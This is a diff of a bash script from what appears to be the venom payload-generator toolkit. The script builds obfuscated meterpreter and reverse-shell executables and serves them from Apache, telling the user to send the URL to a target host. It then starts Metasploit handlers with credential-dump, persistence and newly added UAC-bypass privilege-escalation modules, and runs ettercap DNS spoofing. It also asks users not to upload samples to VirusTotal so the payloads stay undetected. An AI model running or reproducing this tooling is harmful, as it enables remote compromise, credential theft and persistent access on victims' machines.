-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -822,7 +830,7 @@ fi
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
@@ -848,14 +856,14 @@ clear
 # -------------------------------------------------------------
 sh_shellcode4 () {
 # get user input to build shellcode (python)
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> C format ..."
+echo "[☠] Building shellcode -> C format ..."
 # display final settings to user
 cat << !
 
@@ -880,27 +888,27 @@ sleep 2
    # check if all dependencies needed are installed
    # check if template exists (exec.py)
    if [ -e $InJEc2 ]; then
-      echo "[☠ ] exec.py -> found!"
+      echo "[☠] exec.py -> found!"
       sleep 2
    else
-      echo "[☠ ] exec.py -> not found!"
+      echo "[☠] exec.py -> not found!"
       exit
    fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
 # EDITING/BACKUP FILES NEEDED
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc2 $IPATH/templates/exec[bak].py
 
 
@@ -927,13 +935,13 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
    if [ "$ans" "=" "default ($N4m.py) python" ]; then
      zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-     echo "[☠ ] Start a multi-handler..."
-     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-     echo "[☯ ] Please dont test samples on virus total..."
+     echo "[☠] Start a multi-handler..."
+     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+     echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
 
      # CLEANING EVERYTHING UP
-     echo "[☠ ] Cleanning temp generated files..."
+     echo "[☠] Cleanning temp generated files..."
      mv $IPATH/templates/exec[bak].py $InJEc2
      rm $IPATH/output/chars.raw > /dev/null 2>&1
      cd $IPATH/
@@ -944,20 +952,20 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
    elif [ "$ans" "=" "pyherion ($N4m.py) obfuscated" ]; then
      cd $IPATH/obfuscate
      # obfuscating payload (pyherion.py)
-     echo "[☠ ] pyherion -> encrypting..."
+     echo "[☠] pyherion -> encrypting..."
      sleep 2
-     echo "[☠ ] base64+AES encoded -> $N4m.py!"
+     echo "[☠] base64+AES encoded -> $N4m.py!"
      sleep 2
      sudo ./pyherion.py $IPATH/output/$N4m.py $IPATH/output/$N4m.py > /dev/null 2>&1
      zenity --title="☠ PYTHON OUTPUT ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.py" --info > /dev/null 2>&1
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-     echo "[☠ ] Start a multi-handler..."
-     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-     echo "[☯ ] Please dont test samples on virus total..."
+     echo "[☠] Start a multi-handler..."
+     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+     echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
 
      # CLEANING EVERYTHING UP
-     echo "[☠ ] Cleanning temp generated files..."
+     echo "[☠] Cleanning temp generated files..."
      mv $IPATH/templates/exec[bak].py $InJEc2
      rm $IPATH/output/chars.raw > /dev/null 2>&1
      cd $IPATH/
@@ -972,9 +980,9 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
      # check if pyinstaller its installed
      if [ -d $DrIvC/pyinstaller-2.0 ]; then
        # compile python to exe
-       echo "[☠ ] pyinstaller -> found!"
+       echo "[☠] pyinstaller -> found!"
        sleep 2
-       echo "[☠ ] compile $N4m.py -> $cUe.exe"
+       echo "[☠] compile $N4m.py -> $cUe.exe"
        sleep 2
        cd $IPATH/output
        xterm -T "☠ PYINSTALLER ☠" -geometry 110x23 -e "su $user -c 'wine c:/Python26/Python.exe c:/pyinstaller-2.0/pyinstaller.py --noconsole --onefile $IPATH/output/$N4m.py'"
@@ -986,13 +994,13 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
        zenity --title="☠ PYINSTALLER ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$cUe.exe" --info > /dev/null 2>&1
        echo ""
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-       echo "[☠ ] Start a multi-handler..."
-       echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-       echo "[☯ ] Please dont test samples on virus total..."
+       echo "[☠] Start a multi-handler..."
+       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+       echo "[☯] Please dont test samples on virus total..."
        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
 
        # CLEANING EVERYTHING UP
-       echo "[☠ ] Cleanning temp generated files..."
+       echo "[☠] Cleanning temp generated files..."
        mv $IPATH/templates/exec[bak].py $InJEc2
        rm $IPATH/output/chars.raw > /dev/null 2>&1
        sleep 2
@@ -1002,10 +1010,10 @@ ans=$(zenity --list --title "☠ EXECUTABLE FORMAT ☠" --text "\nChose what to 
 
        # compile python to exe
        echo ""
-       echo "[☠ ] pyinstaller -> not found!"
+       echo "[☠] pyinstaller -> not found!"
        sleep 2
-       echo "[☠ ] Please run: cd aux && sudo ./setup.sh"
-       echo "[☠ ] to install all missing dependencies..."
+       echo "[☠] Please run: cd aux && sudo ./setup.sh"
+       echo "[☠] to install all missing dependencies..."
        exit
      fi
    fi
@@ -1024,15 +1032,15 @@ cd $IPATH/
 # ------------------------------------------------------
 sh_shellcode5 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> C format ..."
-echo "[☠ ] obfuscating -> msf encoders!"
+echo "[☠] Building shellcode -> C format ..."
+echo "[☠] obfuscating -> msf encoders!"
 echo "" > $IPATH/output/chars.raw
 # display final settings to user
 cat << !
@@ -1058,34 +1066,34 @@ sleep 2
    # check if all dependencies needed are installed
    # check if template exists
    if [ -e $InJEc3 ]; then
-      echo "[☠ ] exec_bin.c -> found!"
+      echo "[☠] exec_bin.c -> found!"
       sleep 2
    else
-      echo "[☠ ] exec_bin.c -> not found!"
+      echo "[☠] exec_bin.c -> not found!"
       exit
    fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
    # check if mingw32 exists
    c0m=`which i586-mingw32msvc-gcc`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
-      echo "[☠ ] mingw32 compiler -> found!"
+      echo "[☠] mingw32 compiler -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] mingw32 compiler -> not found!"
-      echo "[☠ ] Download compiler -> apt-get install mingw32"
+      echo "[☠] mingw32 compiler -> not found!"
+      echo "[☠] Download compiler -> apt-get install mingw32"
       echo ""
       sudo apt-get install mingw32
       echo ""
@@ -1094,7 +1102,7 @@ sleep 2
 
 # EDITING/BACKUP FILES NEEDED
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc3 $IPATH/templates/exec_bin[bak].c
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 
@@ -1109,7 +1117,7 @@ cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 
 cd $IPATH/templates
 # COMPILING SHELLCODE USING mingw32
-echo "[☠ ] Compiling using mingw32..."
+echo "[☠] Compiling using mingw32..."
 sleep 2
 # special thanks to astr0baby for mingw32 -mwindows flag :D
 i586-mingw32msvc-gcc exec_bin.c -o $N4m.exe -mwindows
@@ -1122,9 +1130,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -1132,7 +1140,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -1153,6 +1161,22 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
 
+    elif [ "$P0" = "privilege_escalation.rc" ]; then
+      cd $IPATH/aux
+      # backup files needed
+      cp privilege_escalation.rc privilege_escalation[bak].rc
+      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
+      # Build resource files needed
+      sed -i "s|N4m|$N4m.exe|g" privilege_escalation.rc
+      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
+      sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
+      # reload metasploit database
+      echo "[☠] copy post-module to msf db!"
+      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      echo "[☠] reloading -> Metasploit database!"
+      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
+      cd $IPATH
+
   else
 
     echo "do nothing" > /dev/null 2>&1
@@ -1167,7 +1191,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -1179,9 +1203,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -1190,9 +1214,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -1200,8 +1224,10 @@ fi
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1
+mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
+mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -1223,14 +1249,14 @@ cd $IPATH/
 # ------------------------------------------------------
 sh_shellcode6 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> psh-cmd format ..."
+echo "[☠] Building shellcode -> psh-cmd format ..."
 echo "" > $IPATH/output/chars.raw
 # display final settings to user
 cat << !
@@ -1252,7 +1278,7 @@ str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
 echo "$str0" > $IPATH/output/chars.raw
 # display shellcode
 echo ""
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 3
 echo $str0
 echo "" && echo ""
@@ -1261,34 +1287,34 @@ echo "" && echo ""
    # check if all dependencies needed are installed
    # check if template exists
    if [ -e $InJEc15 ]; then
-      echo "[☠ ] exec_psh.c -> found!"
+      echo "[☠] exec_psh.c -> found!"
       sleep 2
    else
-      echo "[☠ ] exec_psh.c -> not found!"
+      echo "[☠] exec_psh.c -> not found!"
       exit
    fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw  -> found!"
+      echo "[☠] chars.raw  -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw  -> not found!"
+      echo "[☠] chars.raw  -> not found!"
       exit
       fi
 
    # check if mingw32 exists
    c0m=`which i586-mingw32msvc-gcc`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
-      echo "[☠ ] mingw32 compiler -> found!"
+      echo "[☠] mingw32 compiler -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] mingw32 compiler -> not found!"
-      echo "[☠ ] Download compiler -> apt-get install mingw32"
+      echo "[☠] mingw32 compiler -> not found!"
+      echo "[☠] Download compiler -> apt-get install mingw32"
       echo ""
       sudo apt-get install mingw32
       echo ""
@@ -1297,16 +1323,16 @@ echo "" && echo ""
 
 # EDITING/BACKUP FILES NEEDED
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cd $IPATH/templates
 cp $InJEc15 $IPATH/templates/exec_psh[bak].c
-echo "[☠ ] Injecting shellcode -> $N4m.exe!"
+echo "[☠] Injecting shellcode -> $N4m.exe!"
 sleep 2
 sed "s|InJ3C|$str0|" exec_psh.c > final.c
 
 
 # COMPILING SHELLCODE USING mingw32
-echo "[☠ ] Compiling using mingw32..."
+echo "[☠] Compiling using mingw32..."
 sleep 2
 # special thanks to astr0baby for mingw32 -mwindows flag :D
 i586-mingw32msvc-gcc final.c -o $N4m.exe -mwindows
@@ -1319,9 +1345,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -1329,7 +1355,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.exe on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -1350,6 +1376,22 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
 
+    elif [ "$P0" = "privilege_escalation.rc" ]; then
+      cd $IPATH/aux
+      # backup files needed
+      cp privilege_escalation.rc privilege_escalation[bak].rc
+      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
+      # Build resource files needed
+      sed -i "s|N4m|$N4m.exe|g" privilege_escalation.rc
+      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
+      sed -i "s|N4m|$N4m.exe|g" enigma_fileless_uac_bypass.rb
+      # reload metasploit database
+      echo "[☠] copy post-module to msf db!"
+      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      echo "[☠] reloading -> Metasploit database!"
+      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
+      cd $IPATH
+
   else
 
     echo "do nothing" > /dev/null 2>&1
@@ -1363,7 +1405,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.exe $ApAcHe/$N4m.exe > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -1375,9 +1417,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -1386,9 +1428,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -1396,8 +1438,10 @@ fi
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/exec_psh[bak].c $InJEc15 > /dev/null 2>&1
+mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
+mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -1421,14 +1465,14 @@ cd $IPATH/
 # ------------------------------------------------------------
 sh_shellcode7 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> C format ..."
+echo "[☠] Building shellcode -> C format ..."
 echo "" > $IPATH/output/chars.raw
 # display final settings to user
 cat << !
@@ -1454,28 +1498,28 @@ sleep 2
    # check if all dependencies needed are installed
    # check if template exists
    if [ -e $InJEc4 ]; then
-      echo "[☠ ] exec.rb -> found!"
+      echo "[☠] exec.rb -> found!"
       sleep 2
    else
-      echo "[☠ ] exec.rb -> not found!"
+      echo "[☠] exec.rb -> not found!"
       exit
    fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
 
 # EDITING/BACKUP FILES NEEDED
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc4 $IPATH/templates/exec[bak].rb
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 
@@ -1498,9 +1542,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -1514,7 +1558,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.rb $ApAcHe/$N4m.rb > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
